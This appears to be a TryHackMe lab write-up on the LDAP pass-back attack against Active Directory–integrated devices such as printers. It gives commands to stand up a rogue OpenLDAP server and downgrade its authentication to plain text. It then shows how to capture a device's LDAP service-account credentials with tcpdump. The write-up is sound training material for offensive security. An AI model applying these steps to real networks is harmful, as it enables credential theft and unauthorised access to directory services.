# LDAP bind credentials

Another method of AD authentication that applications can use is Lightweight Directory Access Protocol (LDAP) 
authentication. LDAP authentication is similar to NTLM authentication. And with LDAP authentication, the 
application directly verifies the user's credentials. The application has a pair of AD credentials that it 
can use first to query LDAP and then verify the AD user's credentials.

LDAP authentication is a much used mechanism with third-party (non-Microsoft) applications that integrate with AD. 
Examples of applications and systems:

* Gitlab
* Jenkins
* Custom-developed web applications
* Printers
* VPNs

If any of these applications or services are exposed on the internet, the same type of attacks as leveraged 
against NTLM authenticated systems can be used. And because a service using LDAP authentication requires a set of 
AD credentials, it opens up additional attack avenues. We can attempt to recover the AD credentials used by the 
service to gain authenticated access to AD.

## LDAP pass-back

A common attack against network devices, such as printers, when you have gained initial access to the 
internal network, such as plugging in a rogue device in a boardroom.

LDAP Pass-back attacks can be performed when we gain access to a device's configuration where the LDAP parameters 
are specified. This can be, for example, the web interface of a network printer. Often, the credentials for these 
interfaces are kept to the default ones, such as `admin:admin` or `admin:password`. 

In this case, we can not directly extract the LDAP credentials because the password is hidden. 
But we can alter the LDAP configuration, such as the IP or hostname of the LDAP server. In an LDAP Pass-back attack, 
we can modify this IP to our IP and then test the LDAP configuration, which will force the device to attempt 
LDAP authentication to our rogue device. We can intercept this authentication attempt to recover the LDAP credentials.

## Rogue LDAP server

install OpenLDAP:

    sudo apt-get update && sudo apt-get -y install slapd ldap-utils && sudo systemctl enable slapd

Reconfigure the LDAP server to use `za.tryhackme.com` for the DNS domain name and Organisation:

    sudo dpkg-reconfigure -p low slapd

Make it vulnerable by downgrading the supported authentication mechanisms. Create a file `olcSaslSecProps.ldif`:

```text
# olcSaslSecProps.ldif
dn: cn=config
replace: olcSaslSecProps
olcSaslSecProps: noanonymous,minssf=0,passcred
```

* `olcSaslSecProps`: Specifies the SASL security properties
* `noanonymous`: Disables mechanisms that support anonymous login
* `minssf`: Specifies the minimum acceptable security strength with 0, meaning no protection.

Use the `ldif` file to patch the LDAP:

```text
$ sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
SASL/EXTERNAL authentication started
SASL username: gidNumber=0+uidNumber=0,cn=peercred,cn=external,cn=auth
SASL SSF: 0
modifying entry "cn=config"
```

Check:

    ldapsearch -H ldap:// -x -LLL -s base -b "" supportedSASLMechanisms
    dn:
    supportedSASLMechanisms: PLAIN
    supportedSASLMechanisms: LOGIN

## Capturing LDAP credentials

Click the "Test Settings" at `http://printer.za.tryhackme.com/settings.aspx` again, the authentication will occur 
in clear text. If you the rogue LDAP server is configured correctly, and is downgrading the communication, you 
will receive the following error: "This distinguished name contains invalid syntax". 

If you receive this error, you can use a tcpdump to capture the credentials:

    sudo tcpdump -SX -i breachad tcp port 389